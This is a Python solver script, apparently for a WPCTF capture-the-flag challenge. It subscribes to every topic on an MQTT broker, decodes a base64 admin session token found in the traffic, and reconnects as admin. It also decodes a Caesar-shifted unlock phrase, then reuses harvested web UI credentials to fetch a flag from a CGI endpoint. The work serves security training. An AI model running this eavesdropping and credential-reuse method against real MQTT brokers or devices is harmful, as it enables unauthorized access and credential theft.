#!/usr/bin/env python3

import paho.mqtt.client as mqtt
import os
import sys
import json
import base64
import argparse
import requests
from requests.auth import HTTPBasicAuth
import re

def decode_session_token(session_token):
    """Decode base64 session token and extract admin credentials."""
    try:
        # Decode base64 string
        decoded_bytes = base64.b64decode(session_token)
        decoded_string = decoded_bytes.decode('utf-8')

        # Split by colon to get username and password
        if ':' in decoded_string:
            username, password = decoded_string.split(':', 1)
            return username, password
        else:
            print(f"Warning: No colon separator found in decoded token: {decoded_string}")
            return None, None

    except Exception as e:
        print(f"Error decoding session token: {e}")
        return None, None

def decode_encrypted_unlock_phrase(hex_string):
    """Decode hex string to ASCII, then apply Caesar cipher with shift 1."""
    try:
        # Convert hex to ASCII
        ascii_text = bytes.fromhex(hex_string).decode('ascii')
        print(f"Hex to ASCII: {ascii_text}")

        # Apply Caesar cipher with shift 1 (decode)
        decoded_text = ""
        for char in ascii_text:
            if char.isalpha():
                # Get the base (A for uppercase, a for lowercase)
                base = ord('A') if char.isupper() else ord('a')
                # Apply reverse Caesar cipher (shift -1)
                shifted_char = chr((ord(char) - base - 1) % 26 + base)
                decoded_text += shifted_char
            else:
                # Keep non-alphabetic characters as is
                decoded_text += char

        return decoded_text

    except Exception as e:
        print(f"Error decoding encrypted unlock phrase: {e}")
        return None

def on_connect(client, userdata, flags, rc):
    """Callback for when the client receives a CONNACK response from the server."""
    if rc == 0:
        print("Connected to MQTT broker successfully")
        # Subscribe to all topics using wildcard
        client.subscribe("#")
        print("Subscribed to all topics (#)")
    else:
        print(f"Failed to connect, return code {rc}")
        sys.exit(1)

def on_message(client, userdata, msg):
    """Callback for when a PUBLISH message is received from the server."""
    try:
        topic = msg.topic
        payload = msg.payload.decode('utf-8')

        # Get user data for tracking state
        state = userdata if userdata else {}

        print(f"[{topic}] {payload}")

        # Phase 1: Look for admin credentials
        if not state.get('credentials_found') and "sess_admin" in payload and "session_token" in payload:
            print("\n" + "="*60)
            print("ğŸ¯ FOUND ADMIN CREDENTIALS MESSAGE!")
            print("="*60)
            print(f"Topic: {topic}")
            print(f"Raw Message: {payload}")

            # Parse JSON to extract session_token
            try:
                json_data = json.loads(payload)

                # Access nested session_token from .session_info.session_token
                session_info = json_data.get('session_info', {})
                session_token = session_info.get('session_token', '')

                if session_token:
                    print(f"\nSession Token (base64): {session_token}")

                    # Decode the session token
                    admin_user, admin_password = decode_session_token(session_token)

                    if admin_user and admin_password:
                        print("\n" + "ğŸ”“ ADMIN CREDENTIALS EXTRACTED:")
                        print("-" * 40)
                        print(f"Admin User:     {admin_user}")
                        print(f"Admin Password: {admin_password}")
                        print("-" * 40)

                        # Store credentials and mark as found
                        state['credentials_found'] = True
                        state['admin_user'] = admin_user
                        state['admin_password'] = admin_password

                        print("\nğŸ”„ RECONNECTING WITH ADMIN CREDENTIALS...")

                        # Disconnect current connection
                        client.disconnect()

                        # Create new authenticated client
                        connect_with_credentials(admin_user, admin_password, state)
                        return

                    else:
                        print("âŒ Failed to extract credentials from session token")

                else:
                    print("âŒ No session_token field found in session_info")

            except json.JSONDecodeError as e:
                print(f"âŒ Failed to parse JSON: {e}")
                print("Raw payload:", payload)

        # Phase 2: Look for encrypted_unlock_phrase
        elif state.get('credentials_found') and "encrypted_unlock_phrase" in payload:
            print("\n" + "="*60)
            print("ğŸ” FOUND ENCRYPTED UNLOCK PHRASE MESSAGE!")
            print("="*60)
            print(f"Topic: {topic}")
            print(f"Raw Message: {payload}")

            try:
                json_data = json.loads(payload)
                encrypted_phrase = json_data.get('encrypted_unlock_phrase', '')

                if encrypted_phrase:
                    print(f"\nğŸ”‘ Encrypted Unlock Phrase: {encrypted_phrase}")
                    state['encrypted_unlock_phrase'] = encrypted_phrase
                    state['phrase_found'] = True

                    # Decode the encrypted unlock phrase
                    decoded_phrase = decode_encrypted_unlock_phrase(encrypted_phrase)

                    if decoded_phrase:
                        print(f"âœ… Decoded Unlock Phrase: {decoded_phrase}")
                        state['decoded_unlock_phrase'] = decoded_phrase
                    else:
                        print("âŒ Failed to decode unlock phrase")

                else:
                    print("âŒ No encrypted_unlock_phrase field found")

            except json.JSONDecodeError as e:
                print(f"âŒ Failed to parse JSON: {e}")

        # Phase 3: Look for secure administrative channel
        elif state.get('credentials_found') and "Secure administrative channel available" in payload:
            print("\n" + "="*60)
            print("ğŸ“ FOUND SECURE ADMINISTRATIVE CHANNEL MESSAGE!")
            print("="*60)
            print(f"Topic: {topic}")
            print(f"Raw Message: {payload}")

            try:
                json_data = json.loads(payload)
                location = json_data.get('location', '')

                if location:
                    print(f"\nğŸ“ Location: {location}")
                    state['location'] = location
                    state['location_found'] = True
                else:
                    print("âŒ No location field found")

            except json.JSONDecodeError as e:
                print(f"âŒ Failed to parse JSON: {e}")

        # Phase 4: Look for Web UI credentials on credentials/unlock topic
        elif topic == "credentials/unlock":
            print("\n" + "="*60)
            print("ğŸŒ FOUND WEB UI CREDENTIALS MESSAGE!")
            print("="*60)
            print(f"Topic: {topic}")
            print(f"Raw Message: {payload}")

            try:
                json_data = json.loads(payload)
                webui_user = json_data.get('username', '')
                webui_password = json_data.get('password', '')

                if webui_user and webui_password:
                    print(f"\nğŸ” WEB UI CREDENTIALS EXTRACTED:")
                    print("-" * 40)
                    print(f"WebUI User:     {webui_user}")
                    print(f"WebUI Password: {webui_password}")
                    print("-" * 40)

                    # Store web UI credentials
                    state['webui_user'] = webui_user
                    state['webui_password'] = webui_password
                    state['webui_credentials_found'] = True

                    # Access web UI and get flag
                    target = state.get('target')
                    webui_port = state.get('webui_port')

                    print(f"\nğŸš€ ACCESSING WEB UI...")
                    success = access_web_ui_and_get_flag(webui_user, webui_password, target, webui_port)

                    if success:
                        print("\nğŸ‰ MISSION ACCOMPLISHED! FLAG RETRIEVED!")
                        client.disconnect()
                        sys.exit(0)
                    else:
                        print("âŒ Failed to retrieve flag from Web UI")

                else:
                    print("âŒ Missing username or password in credentials/unlock message")

            except json.JSONDecodeError as e:
                print(f"âŒ Failed to parse JSON: {e}")
                print("Raw payload:", payload)

        # Check if we have everything we need
        if state.get('phrase_found') and state.get('location_found'):
            print("\n" + "ğŸ‰" + "="*58 + "ğŸ‰")
            print("ğŸ¯ ALL TARGET DATA COLLECTED!")
            print("="*60)
            print(f"Admin User:             {state.get('admin_user', 'N/A')}")
            print(f"Admin Password:         {state.get('admin_password', 'N/A')}")
            print(f"Decoded Unlock Phrase:  {state.get('decoded_unlock_phrase', 'N/A')}")
            print(f"Location:               {state.get('location', 'N/A')}")
            print("="*60)

            # Send the decoded unlock phrase to the location channel
            decoded_phrase = state.get('decoded_unlock_phrase')
            location_channel = state.get('location')

            if decoded_phrase and location_channel:
                print(f"ğŸ“¤ SENDING UNLOCK PHRASE TO CHANNEL: {location_channel}")
                print(f"ğŸ“¤ MESSAGE: {decoded_phrase}")

                # Publish the decoded unlock phrase to the location channel
                client.publish(location_channel, decoded_phrase)

                # Mark that we've sent the message and continue listening for response
                state['message_sent'] = True
                print("âœ… Message sent! Waiting for response...")
                print("ğŸ” Continuing to listen for incoming messages...\n")

            else:
                print("âŒ Missing decoded phrase or location - cannot send message")
                client.disconnect()
                sys.exit(1)

        # If we've sent the message, print any new incoming messages (potential flag response)
        elif state.get('message_sent'):
            print(f"ğŸ“¥ RESPONSE MESSAGE:")
            print(f"[{topic}] {payload}")

            # Check if this looks like a flag or important response
            if any(keyword in payload.lower() for keyword in ['flag', 'wpctf', 'congratulations', 'success', 'unlock']):
                print("\n" + "ğŸš©" + "="*58 + "ğŸš©")
                print("ğŸ¯ POTENTIAL FLAG OR SUCCESS MESSAGE DETECTED!")
                print("="*60)
                print(f"Topic: {topic}")
                print(f"Message: {payload}")
                print("="*60)
                # Continue listening for more messages - don't exit yet

    except Exception as e:
        print(f"Error processing message: {e}")

def connect_with_credentials(username, password, state):
    """Connect to MQTT broker with admin credentials."""
    try:
        # Get connection details from state
        target = state.get('target')
        port = state.get('port')

        print(f"Connecting with admin credentials to {target}:{port}")

        # Create new MQTT client with authentication
        auth_client = mqtt.Client()
        auth_client.username_pw_set(username, password)

        # Set callbacks
        auth_client.on_connect = on_connect_authenticated
        auth_client.on_message = on_message
        auth_client.on_disconnect = on_disconnect

        # Pass state to the new client
        auth_client.user_data_set(state)

        # Connect to the broker
        auth_client.connect(target, port, 60)

        # Start the loop
        auth_client.loop_forever()

    except Exception as e:
        print(f"Error connecting with credentials: {e}")
        sys.exit(1)

def on_connect_authenticated(client, userdata, flags, rc):
    """Callback for authenticated connection."""
    if rc == 0:
        print("âœ… Connected to MQTT broker with admin credentials!")
        client.subscribe("#")
        print("ğŸ” Subscribed to all topics, looking for encrypted_unlock_phrase and location...")
    else:
        print(f"âŒ Failed to connect with admin credentials, return code {rc}")
        sys.exit(1)

def on_disconnect(client, userdata, rc):
    """Callback for when the client disconnects from the server."""
    print(f"Disconnected from MQTT broker (code: {rc})")

def parse_arguments():
    """Parse command line arguments."""
    parser = argparse.ArgumentParser(
        description='MQTT Admin Credential Extractor - Monitors MQTT traffic for admin credentials',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  %(prog)s -H 192.168.1.100 -P 1883
  %(prog)s --host mqtt.example.com --port 8883
  %(prog)s -H 10.0.0.1 -P 8883

This tool subscribes to all MQTT topics and monitors for messages containing
'sess_admin' and 'session_token'. When found, it automatically decodes the
base64 session_token to extract admin username and password.
        '''
    )

    parser.add_argument(
        '-H', '--host',
        type=str,
        required=True,
        help='MQTT broker hostname or IP address (required)'
    )

    parser.add_argument(
        '-P', '--port',
        type=int,
        required=True,
        help='MQTT broker port number (required)'
    )

    parser.add_argument(
        '-W', '--webui-port',
        type=int,
        required=True,
        help='Web UI port number for flag retrieval (required)'
    )

    parser.add_argument(
        '--version',
        action='version',
        version='%(prog)s 1.0 - MQTT Admin Credential Extractor'
    )

    return parser.parse_args()

def main():
    # Parse command line arguments
    args = parse_arguments()

    target = args.host
    port = args.port
    webui_port = args.webui_port

    print("MQTT Admin Credential Extractor v1.0")
    print("="*50)
    print(f"Target Host: {target}")
    print(f"Target Port: {port}")
    print(f"Web UI Port: {webui_port}")
    print("="*50)
    print("Phase 1: Looking for admin credentials...")
    print("Phase 2: Will reconnect with admin auth and look for encrypted_unlock_phrase")
    print("Phase 3: Will look for location from 'Secure administrative channel available' message")
    print("Phase 4: Will look for Web UI credentials on 'credentials/unlock' topic\n")

    # Create MQTT client
    client = mqtt.Client()

    # Set callbacks
    client.on_connect = on_connect
    client.on_message = on_message
    client.on_disconnect = on_disconnect

    # Store connection info in client userdata
    initial_state = {
        'target': target,
        'port': port,
        'webui_port': webui_port,
        'credentials_found': False,
        'phrase_found': False,
        'location_found': False
    }
    client.user_data_set(initial_state)

    try:
        # Connect to the broker
        print(f"Connecting to MQTT broker at {target}:{port}...")
        client.connect(target, port, 60)

        # Start the loop to process network traffic and callbacks
        print("Starting MQTT listener... (Press Ctrl+C to stop)")
        client.loop_forever()

    except KeyboardInterrupt:
        print("\nKeyboard interrupt received. Disconnecting...")
        client.disconnect()
    except Exception as e:
        print(f"Error: {e}")
        sys.exit(1)

def access_web_ui_and_get_flag(webui_user, webui_password, target, webui_port):
    """Access web UI with credentials and retrieve flag from /cgi-bin/flag.cgi."""
    try:
        base_url = f"http://{target}:{webui_port}"

        print(f"ğŸŒ Accessing Web UI at {base_url}")
        print(f"ğŸ” Using credentials: {webui_user}:{webui_password}")

        # Make request to main page with basic auth
        auth = HTTPBasicAuth(webui_user, webui_password)
        response = requests.get(base_url, auth=auth, timeout=10)

        if response.status_code == 200:
            print("âœ… Successfully authenticated to Web UI!")
            print(f"ğŸ“„ Response content ({len(response.text)} chars):")
            print(response.text[:500] + "..." if len(response.text) > 500 else response.text)

            # Search for /cgi-bin/flag.cgi in the response
            flag_cgi_pattern = r'/cgi-bin/flag\.cgi'
            if re.search(flag_cgi_pattern, response.text):
                print("\nğŸ¯ Found /cgi-bin/flag.cgi reference in the page!")

                # Make request to flag.cgi
                flag_url = f"{base_url}/cgi-bin/flag.cgi"
                print(f"ğŸš© Requesting flag from: {flag_url}")

                flag_response = requests.get(flag_url, auth=auth, timeout=10)

                if flag_response.status_code == 200:
                    # Extract flag in WPCTF{...} format
                    flag_pattern = r'WPCTF\{[^}]+\}'
                    flag_match = re.search(flag_pattern, flag_response.text)

                    if flag_match:
                        flag = flag_match.group(0)
                        print("\n" + "ğŸ‰" + "="*58 + "ğŸ‰")
                        print("ğŸ FLAG EXTRACTED SUCCESSFULLY!")
                        print("="*60)
                        print(f"FLAG: {flag}")
                        print("="*60)

                        # Also print the full response for context
                        print(f"\nFull response from flag.cgi:")
                        print(flag_response.text)
                        return True
                    else:
                        print("\nâŒ No WPCTF{...} flag found in response")
                        print("Full response content:")
                        print(flag_response.text)
                        return False
                else:
                    print(f"âŒ Failed to access flag.cgi - Status: {flag_response.status_code}")
                    print(f"Response: {flag_response.text}")
            else:
                print("âŒ No /cgi-bin/flag.cgi reference found in the web page")

                # Try to access flag.cgi directly anyway
                flag_url = f"{base_url}/cgi-bin/flag.cgi"
                print(f"ğŸ” Trying direct access to: {flag_url}")

                flag_response = requests.get(flag_url, auth=auth, timeout=10)

                if flag_response.status_code == 200:
                    # Extract flag in WPCTF{...} format
                    flag_pattern = r'WPCTF\{[^}]+\}'
                    flag_match = re.search(flag_pattern, flag_response.text)

                    if flag_match:
                        flag = flag_match.group(0)
                        print("\n" + "ğŸ‰" + "="*58 + "ğŸ‰")
                        print("ğŸ FLAG EXTRACTED SUCCESSFULLY!")
                        print("="*60)
                        print(f"FLAG: {flag}")
                        print("="*60)
                        return True

                print("Searching for other potential flag-related links...")
                # Look for other potential flag links
                flag_patterns = [r'flag', r'cgi-bin', r'admin']
                for pattern in flag_patterns:
                    matches = re.findall(f'[^\\s"\'<>]*{pattern}[^\\s"\'<>]*', response.text, re.IGNORECASE)
                    if matches:
                        print(f"Found {pattern}-related links: {matches}")
        else:
            print(f"âŒ Failed to authenticate to Web UI - Status: {response.status_code}")
            print(f"Response: {response.text}")

    except Exception as e:
        print(f"âŒ Error accessing Web UI: {e}")

    return False

if __name__ == "__main__":
    main()
